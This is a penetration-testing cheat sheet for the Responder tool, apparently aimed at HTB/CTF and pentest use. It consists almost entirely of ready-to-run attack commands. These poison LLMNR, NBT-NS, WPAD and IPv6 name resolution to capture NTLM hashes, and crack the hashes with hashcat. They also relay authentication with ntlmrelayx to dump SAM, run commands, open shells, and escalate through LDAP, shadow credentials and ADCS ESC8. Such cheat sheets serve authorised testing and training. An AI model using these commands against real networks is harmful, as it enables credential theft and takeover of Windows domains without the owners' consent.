title: Responder
html:
Responder

LLMNR/NBT-NS/mDNS poisoner and NTLM credential catcher. Intercepts broadcast name resolution to capture NTLMv1/v2 hashes from Windows hosts on the local network.

Analyze Mode (Passive — No Poisoning)

# Listen and log requests without responding (safe recon)
responder -I <interface> -A

# Identify hosts making LLMNR/NBT-NS requests
responder -I eth0 -A

# Verbose analyze
responder -I <interface> -A -v

Full Poisoning

# Full poisoning — LLMNR + NBT-NS + WPAD
responder -I <interface> -wf

# Standard HTB/CTF setup
responder -I <interface> -wd

# With verbose output
responder -I <interface> -wf -v

# Force NTLM downgrade (may capture NTLMv1)
responder -I <interface> -wf --lm

# Disable SMB/HTTP servers (relay mode — run ntlmrelayx instead)
responder -I <interface> -wd --disable-ess
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off

Captured Hash Location

# Hash log files
ls /usr/share/responder/logs/
ls ~/.responder/logs/

# View captured NTLMv2 hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt

# View all captured hashes
cat /usr/share/responder/logs/*.txt

# Crack with hashcat (NTLMv2 = mode 5600)
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt <wordlist>
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt <wordlist> -r /usr/share/hashcat/rules/best64.rule

# Crack NTLMv1 (mode 5500)
hashcat -m 5500 /usr/share/responder/logs/SMB-NTLMv1-<ip>.txt <wordlist>

SMB Relay with ntlmrelayx

# Step 1: Disable SMB and HTTP in Responder config
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Step 2: Start Responder (poisoner only)
responder -I <interface> -wd

# Step 3: Start ntlmrelayx targeting a host
# Relay to single target — dump SAM
ntlmrelayx.py -t smb://<ip> -smb2support

# Relay and execute command
ntlmrelayx.py -t smb://<ip> -smb2support -c 'whoami'

# Relay to multiple targets (file of IPs)
ntlmrelayx.py -tf /tmp/targets.txt -smb2support

# Interactive SMB shell
ntlmrelayx.py -t smb://<ip> -smb2support -i

# Relay to LDAP (add computer, RBCD, etc.)
ntlmrelayx.py -t ldap://<dc-ip> --escalate-user <username>

# Relay to LDAPS for shadow credentials / ADCS
ntlmrelayx.py -t ldaps://<dc-ip> --shadow-credentials --shadow-target <target-computer>$

# ADCS relay (ESC8)
ntlmrelayx.py -t http://<ca-ip>/certsrv/certfnsh.asp -smb2support --adcs --template <template>

WPAD Attack

# Serve a malicious WPAD file to intercept browser proxied auth
responder -I <interface> -wPF

# -w: WPAD rogue server
# -P: force NTLM auth for WPAD
# -F: force NTLM auth for HTTP

# Combined with full poisoning
responder -I <interface> -wPFf

Common Options Reference

# Key flags:
# -I   Network interface to listen on
# -A   Analyze mode (passive, no poisoning)
# -w   Start WPAD rogue server
# -f   Fingerprint OS / browser
# -d   Enable NBT-NS poisoning
# -v   Verbose
# -F   Force WPAD auth
# -P   Force NTLM auth for WPAD
# --lm Force LM hashing (NTLMv1 downgrade)
# --disable-ess Disable Extended Session Security

# Config file
cat /etc/responder/Responder.conf

# Clear previous Responder database
rm /usr/share/responder/Responder.db

# Check listening services
ss -tlnp | grep -E ':(445|80|88|138|139)'

mitm6 (IPv6 WPAD Poisoning)

# mitm6 + ntlmrelayx for IPv6 WPAD attack (domain-wide)
# Step 1: Start mitm6
mitm6 -d <domain>

# Step 2: Start ntlmrelayx with LDAP target
ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh wpad.<domain> -l /tmp/loot

# This captures machine account credentials as computers authenticate
# via fake IPv6 WPAD proxy -> relay to LDAP for enumeration/escalation
excerpt: Responder LLMNR/NBT-NS/mDNS poisoner. Capture NTLMv1/v2 hashes, SMB relay with ntlmrelayx, WPAD attacks, mitm6 IPv6 poisoning.
